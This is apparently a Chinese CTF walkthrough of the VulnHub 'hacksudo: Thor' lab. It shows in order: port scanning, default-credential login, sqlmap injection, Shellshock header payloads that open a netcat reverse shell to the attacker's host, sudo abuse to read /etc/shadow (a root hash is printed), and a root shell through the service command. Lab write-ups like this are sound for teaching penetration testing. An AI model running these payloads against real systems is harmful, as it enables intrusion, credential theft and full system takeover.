靶机地址：[hacksudo: Thor ~ VulnHub](https://www.vulnhub.com/entry/hacksudo-thor,733/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.39
sudo nmap -p21,22,80 -sV 192.168.1.39
# 21/tcp filtered ftp
# 22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp open     http    Apache httpd 2.4.38 ((Debian))
```
先访问Web服务看看，是一个登录页面，简单试了一下，没发现什么问题
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.39
# 200 -    4KB - /README.md
# 200 -    1KB - /admin_login.php
# 403 -  277B  - /cgi-bin/
```
发现了项目托管在了github上，看一下源码，有sql文件，获取到账号密码
```SQL
INSERT INTO `admin` VALUES (1,'admin','password123');
```
登一下后台 `/admin_login.php` 试试，成功登录系统
后台中可以看到用户信息
```
zakee94    nafees123
salman     salman123
tushar     tushar123
jon        snow123
```

用户管理页面的搜索功能存在sql注入
```Shell
sqlmap -r req.txt -p "search" --dbs --dbms=mysql --time-sec=1 --threads=8
# hacksudo
sqlmap -r req.txt -p "search" -D "hacksudo" --tables --dbms=mysql --time-sec=1 --threads=8
```

对 `/cgi-bin/` 进行路径扫描
```Shell
sudo dirsearch -u http://192.168.1.39/cgi-bin/ -f -e cgi,sh
# 500 -  610B  - /cgi-bin/backup.cgi
# 500 -  610B  - /cgi-bin/shell.sh
```
扫描是否存在破壳漏洞
```Shell
sudo nmap -p80 -sV --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.1.39
# 可以利用
sudo nmap -p80 -sV --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=id 192.168.1.39
# 可以利用
```
扫描结果显示可以通过标头投毒来利用破壳漏洞
```Shell
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'which nc'" http://192.168.1.39/cgi-bin/shell.sh
```
反弹shell
```Shell
curl -H "X-Frame-Options: () { :; }; echo; /bin/bash -c 'nc -e /bin/bash 192.168.1.26 4444'" http://192.168.1.39/cgi-bin/shell.sh
# 或
curl -H "x: () { :; }; echo; /bin/bash -c 'nc -e /bin/bash 192.168.1.26 4444'" http://192.168.1.39/cgi-bin/shell.sh
```
成功获取到 `www-data` 的shell，接下来尝试提权
```Shell
ls -l /etc/passwd
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# thor:x:1001:1001:,,,:/home/thor:/bin/bash
sudo -l
# (thor) NOPASSWD: /home/thor/./hammer.sh
```
尝试一下
```Shell
sudo -u thor /home/thor/./hammer.sh
# Enter Thor  Secret Key : abc
# Hey Dear ! I am abc , Please enter your Secret massage : hello
```
提示需要输入密钥第一个随便输，第二个可以输入命令
```
Enter Thor  Secret Key : abc
Hey Dear ! I am abc , Please enter your Secret massage : id
uid=1001(thor) gid=1001(thor) groups=1001(thor)
```
试试直接获取shell
```
Enter Thor  Secret Key : abc
Hey Dear ! I am id , Please enter your Secret massage : bash
```
成功获取到shell
```Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
# (root) NOPASSWD: /usr/bin/cat, /usr/sbin/service
```
尝试一下
```Shell
sudo cat /etc/shadow
# root:$6$1YV0h.2rYTAvcB.o$cLPgAevmbnBo8dtADheWYcIfGLg157gfrCzZsKqv268MDkimBW7JcnQK6sI79fXsa1Hm5GmP8Kni05w.2nJfc0:18838:0:99999:7:::
```
可以考虑破解 `root` 密码
`service` 命令可以直接提权
```Shell
sudo service ../../bin/bash
```
提权成功

尝试其它提权
```Shell
cd /tmp
export PATH=$PATH:/tmp
```